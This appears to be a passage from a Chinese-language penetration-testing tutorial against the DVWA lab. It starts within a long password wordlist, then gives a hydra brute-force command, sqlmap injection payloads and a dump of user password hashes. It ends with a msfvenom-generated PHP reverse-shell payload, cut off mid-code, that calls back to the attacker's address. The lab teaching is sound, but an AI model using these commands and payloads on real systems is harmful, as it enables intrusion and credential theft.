</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">5201314
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">woaini1314
</span></span><span class="line"><span class="cl">qq123456
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">7758521
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">a123123
</span></span><span class="line"><span class="cl">123456aa
</span></span><span class="line"><span class="cl">woaini520        
</span></span><span class="line"><span class="cl">woaini
</span></span><span class="line"><span class="cl">100200
</span></span><span class="line"><span class="cl">1314520
</span></span><span class="line"><span class="cl">woaini123
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">q123456
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456789a
</span></span><span class="line"><span class="cl">5211314
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">a123456789
</span></span><span class="line"><span class="cl">z123456
</span></span><span class="line"><span class="cl">asd123456
</span></span><span class="line"><span class="cl">a5201314
</span></span><span class="line"><span class="cl">aa123456
</span></span><span class="line"><span class="cl">zhang123
</span></span><span class="line"><span class="cl">aptx4869
</span></span><span class="line"><span class="cl">123123a
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">5201314a
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">aini1314
</span></span><span class="line"><span class="cl">31415926
</span></span><span class="line"><span class="cl">q1w2e3r4
</span></span><span class="line"><span class="cl">123456qq
</span></span><span class="line"><span class="cl">woaini521
</span></span><span class="line"><span class="cl">1234qwer
</span></span><span class="line"><span class="cl">a111111
</span></span><span class="line"><span class="cl">520520
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">abc123 
</span></span><span class="line"><span class="cl">110110
</span></span><span class="line"><span class="cl">111111a          
</span></span><span class="line"><span class="cl">123456abc        
</span></span><span class="line"><span class="cl">w123456
</span></span><span class="line"><span class="cl">7758258
</span></span><span class="line"><span class="cl">123qweasd
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">a000000
</span></span><span class="line"><span class="cl">qq123123
</span></span><span class="line"><span class="cl">zxc123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">abc123456
</span></span><span class="line"><span class="cl">123456q
</span></span><span class="line"><span class="cl">qq5201314
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">000000a          
</span></span><span class="line"><span class="cl">456852
</span></span><span class="line"><span class="cl">as123456
</span></span><span class="line"><span class="cl">1314521          
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">521521
</span></span><span class="line"><span class="cl">qazwsx123
</span></span><span class="line"><span class="cl">zxc123456
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">666666
</span></span><span class="line"><span class="cl">love1314
</span></span><span class="line"><span class="cl">QAZ123
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">aaaaaa
</span></span><span class="line"><span class="cl">a123321
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">11111111
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">5845201314
</span></span><span class="line"><span class="cl">s123456
</span></span><span class="line"><span class="cl">nihao123
</span></span><span class="line"><span class="cl">caonima123
</span></span><span class="line"><span class="cl">zxcvbnm123
</span></span><span class="line"><span class="cl">wang123
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">1A2B3C4D
</span></span><span class="line"><span class="cl">asdasd123
</span></span><span class="line"><span class="cl">584520
</span></span><span class="line"><span class="cl">753951
</span></span><span class="line"><span class="cl">147258
</span></span><span class="line"><span class="cl">1123581321
</span></span><span class="line"><span class="cl">110120
</span></span><span class="line"><span class="cl">qq1314520        
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">idc123!@#
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">aaa123!@#
</span></span><span class="line"><span class="cl">qq123.com
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">wantian##*(
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">qwe1234
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">123qwer
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1qaz
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">!Q@W#E
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">147369
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">aistar123&lt;&gt;!N
</span></span><span class="line"><span class="cl">321
</span></span><span class="line"><span class="cl">idcji2010
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">336699
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">111
</span></span><span class="line"><span class="cl">111qqq...
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">953139.
</span></span><span class="line"><span class="cl">0258
</span></span><span class="line"><span class="cl">111qqq!!!
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">qqii
</span></span><span class="line"><span class="cl">tyinfo
</span></span><span class="line"><span class="cl">abcd36888
</span></span><span class="line"><span class="cl">rst_login
</span></span><span class="line"><span class="cl">OAOidc
</span></span><span class="line"><span class="cl">OAOidc123!@#
</span></span><span class="line"><span class="cl">OAOidc123
</span></span><span class="line"><span class="cl">esin888
</span></span><span class="line"><span class="cl">qwer
</span></span><span class="line"><span class="cl">power123
</span></span><span class="line"><span class="cl">power.liu
</span></span><span class="line"><span class="cl">power.yu
</span></span><span class="line"><span class="cl">dns99+588
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">7715123
</span></span><span class="line"><span class="cl">sdwer
</span></span><span class="line"><span class="cl">power.zhao
</span></span><span class="line"><span class="cl">sdwer123
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">esincs
</span></span><span class="line"><span class="cl">jspower123.0
</span></span><span class="line"><span class="cl">5656789
</span></span><span class="line"><span class="cl">2323456
</span></span><span class="line"><span class="cl">power.com
</span></span><span class="line"><span class="cl">power123.0
</span></span><span class="line"><span class="cl">power0.123
</span></span><span class="line"><span class="cl">jspower.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">hlwj0519-1205.jf
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">zaxscdvf
</span></span><span class="line"><span class="cl">..0
</span></span><span class="line"><span class="cl">!@#$QWER
</span></span><span class="line"><span class="cl">95313
</span></span><span class="line"><span class="cl">1231321
</span></span><span class="line"><span class="cl">321123
</span></span><span class="line"><span class="cl">vipnew
</span></span><span class="line"><span class="cl">idc0514
</span></span><span class="line"><span class="cl">1235698
</span></span><span class="line"><span class="cl">235689
</span></span><span class="line"><span class="cl">326598
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">idc11
</span></span><span class="line"><span class="cl">21vianet
</span></span><span class="line"><span class="cl">#@!ewq
</span></span><span class="line"><span class="cl">1010
</span></span><span class="line"><span class="cl">111qqq
</span></span><span class="line"><span class="cl">1234%^&amp;*
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">4867086
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">123456!@#
</span></span><span class="line"><span class="cl">10000
</span></span><span class="line"><span class="cl">794613
</span></span><span class="line"><span class="cl">784512
</span></span><span class="line"><span class="cl">895623
</span></span><span class="line"><span class="cl">789456
</span></span><span class="line"><span class="cl">456123
</span></span><span class="line"><span class="cl">654321
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">1234!@#$
</span></span><span class="line"><span class="cl">11185
</span></span><span class="line"><span class="cl">12345!@#$%
</span></span><span class="line"><span class="cl">qwe123!@#
</span></span><span class="line"><span class="cl">!@#123
</span></span><span class="line"><span class="cl">!@#321
</span></span><span class="line"><span class="cl">123#@!
</span></span><span class="line"><span class="cl">19861212
</span></span><span class="line"><span class="cl">19831212
</span></span><span class="line"><span class="cl">19841020
</span></span><span class="line"><span class="cl">#@!123
</span></span><span class="line"><span class="cl">#@!321
</span></span><span class="line"><span class="cl">idcidc
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">!@#$%^&amp;*()
</span></span><span class="line"><span class="cl">)(*&amp;^%$#@!
</span></span><span class="line"><span class="cl">0987654321
</span></span><span class="line"><span class="cl">tyidc
</span></span><span class="line"><span class="cl">1122
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">idcidcok
</span></span><span class="line"><span class="cl">idcuser
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">1234abcd
</span></span><span class="line"><span class="cl">caonima
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">888888
</span></span><span class="line"><span class="cl">admin!@#
</span></span><span class="line"><span class="cl">abc!@#
</span></span><span class="line"><span class="cl">!Q@W#E$R%T
</span></span><span class="line"><span class="cl">idc2010
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">qqaazz
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">admin
</span></span><span class="line"><span class="cl">admin1
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">aaa111
</span></span><span class="line"><span class="cl">111aaa
</span></span><span class="line"><span class="cl">123aaa
</span></span><span class="line"><span class="cl">lh222
</span></span><span class="line"><span class="cl">lhidc
</span></span><span class="line"><span class="cl">123a
</span></span><span class="line"><span class="cl">a123
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">qazwsx
</span></span><span class="line"><span class="cl">qazxsw
</span></span><span class="line"><span class="cl">0123
</span></span><span class="line"><span class="cl">123112233
</span></span><span class="line"><span class="cl">123111
</span></span><span class="line"><span class="cl">www.7x24.cn
</span></span><span class="line"><span class="cl">shisp.net
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">1230..
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456qwe
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">12345qwert
</span></span><span class="line"><span class="cl">zxcvbnm
</span></span><span class="line"><span class="cl">qwerty
</span></span><span class="line"><span class="cl">qweqwe
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">123ewq
</span></span><span class="line"><span class="cl">qwe321
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">1234rewq
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">lituobestsanmao
</span></span><span class="line"><span class="cl">!@#19841010
</span></span><span class="line"><span class="cl">msfadmin
</span></span><span class="line"><span class="cl">19885510
</span></span><span class="line"><span class="cl">xyidc_2006
</span></span><span class="line"><span class="cl">95217189
</span></span><span class="line"><span class="cl">95217
</span></span><span class="line"><span class="cl">chinayixun
</span></span><span class="line"><span class="cl">huachen1258zz
</span></span><span class="line"><span class="cl">sanhe123
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">3H8IDC72sanhe000
</span></span><span class="line"><span class="cl">xiaoyili
</span></span><span class="line"><span class="cl">sanhe000~!@#  
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">ccfeng66131421  
</span></span><span class="line"><span class="cl">!@#59560955
</span></span><span class="line"><span class="cl">tkggja850518`1
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">anada325!@#
</span></span><span class="line"><span class="cl">www.txwscx.comsritgyxf2sxy19831122zx
</span></span><span class="line"><span class="cl">ZHONGGUO$#@!999@
</span></span><span class="line"><span class="cl">admin13906271234
</span></span><span class="line"><span class="cl">395835961
</span></span><span class="line"><span class="cl">senlinyan
</span></span><span class="line"><span class="cl">3203672
</span></span><span class="line"><span class="cl">9527999!!!
</span></span><span class="line"><span class="cl">P@ssw0rd
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">idc9aewr42
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">qsx6059410172.
</span></span><span class="line"><span class="cl">idc0001
</span></span><span class="line"><span class="cl">idc800888
</span></span><span class="line"><span class="cl">idc46121
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">882627.8
</span></span><span class="line"><span class="cl">luofei520!@#123
</span></span><span class="line"><span class="cl">852799!!!
</span></span><span class="line"><span class="cl">idc0123.0
</span></span><span class="line"><span class="cl">513tyml.com
</span></span><span class="line"><span class="cl">abc123!@#
</span></span><span class="line"><span class="cl">1q2w3e,./? &gt;&lt;
</span></span><span class="line"><span class="cl">6504710shuazuan
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">752883855.
</span></span><span class="line"><span class="cl">senlinyan$
</span></span><span class="line"><span class="cl">admin001
</span></span><span class="line"><span class="cl">6695zx
</span></span><span class="line"><span class="cl">scictd9821622
</span></span><span class="line"><span class="cl">365obsserver!
</span></span><span class="line"><span class="cl">ranglm123456
</span></span><span class="line"><span class="cl">13920225257
</span></span><span class="line"><span class="cl">idc925111
</span></span><span class="line"><span class="cl">1qaz@wsx#edc
</span></span><span class="line"><span class="cl">.......199
</span></span><span class="line"><span class="cl">xu15817079919
</span></span><span class="line"><span class="cl">yanjin0429
</span></span><span class="line"><span class="cl">zhangznw
</span></span><span class="line"><span class="cl">13527380230
</span></span><span class="line"><span class="cl">idc0.01
</span></span><span class="line"><span class="cl">idc123&amp;123
</span></span><span class="line"><span class="cl">662766
</span></span><span class="line"><span class="cl">122.224
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">.......199@
</span></span><span class="line"><span class="cl">liuzhangzi1988
</span></span><span class="line"><span class="cl">123456!@#$%^
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">dahouzi110
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">trista188#**
</span></span><span class="line"><span class="cl">mm1237
</span></span><span class="line"><span class="cl">07736056123
</span></span><span class="line"><span class="cl">TnHoo15862380404
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">189532210113
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">gedingfeng1102888
</span></span></code></pre></td></tr></table>
</div>
</div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>整合一下，需要执行的指令就是下面这个了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span class="s2">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>它很快就会给你破解出来</p>
<p></p>
<p></p>
<p>由上图可看出，密码就是<code>password</code></p>
<p>接下来我们尝试登录</p>
<p></p>
<p>如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
</p>
<h3 id="第二关简单sql注入">第二关|简单SQL注入</h3>
<p>第一关过了以后，我们要看看它的数据库里面有什么</p>
<h4 id="抓包-1">抓包</h4>
<p>我们回到他这个网页，先进入<code>DVWA Security</code>，把安全等级改成<code>Low</code></p>
<p></p>
<p>再点击<code>SQL Injection</code>这个按钮，进入这个页面。</p>
<p></p>
<p>接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）</p>
<p>在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个<code>Submit</code>按钮，Burp就会自动抓包了</p>
<p></p>
<p>将它保存为一个txt文件，但是要记住它的位置，比如我的是<code>~/get.txt</code></p>
<p></p>
<p>这样抓包工作就完成了。</p>
<h4 id="使用sqlmap注入">使用sqlmap注入</h4>
<p>接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频</p>
<p>我们先扫描一下注入点</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;get.txt&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p></p>
<p>这里均选<code>y</code>即可。</p>
<p></p>
<p>最后一个选项选<code>n</code>不必浪费时间了。</p>
<p></p>
<p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Parameter: id (GET)
</span></span><span class="line"><span class="cl">    Type: boolean-based blind
</span></span><span class="line"><span class="cl">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: error-based
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: time-based blind
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: UNION query
</span></span><span class="line"><span class="cl">    Title: MySQL UNION query (NULL) - 2 columns
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] the back-end DBMS is MySQL
</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;= 4.1
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;~/get.txt&#34;</span> --dump
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>出来了。</p>
<p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Database: dvwa
</span></span><span class="line"><span class="cl">Table: users
</span></span><span class="line"><span class="cl">[5 entries]
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| user_id | user    | avatar                                                | password                                    | last_name | first_name |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
</span></span><span class="line"><span class="cl">| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
</span></span><span class="line"><span class="cl">| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
</span></span><span class="line"><span class="cl">| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
</span></span><span class="line"><span class="cl">| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
<p>Well,</p>
<p>接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。</p>
<p>知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。</p>
<p>这次也将使用PHP文件作为<strong>木马</strong>进行攻击。</p>
<h4 id="生成木马">生成木马</h4>
<p>我们用 <strong><code>msfvenom</code></strong> 这个命令来生成。执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.106 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o test.php
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这样就生成好了。来看看里面有什么？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span 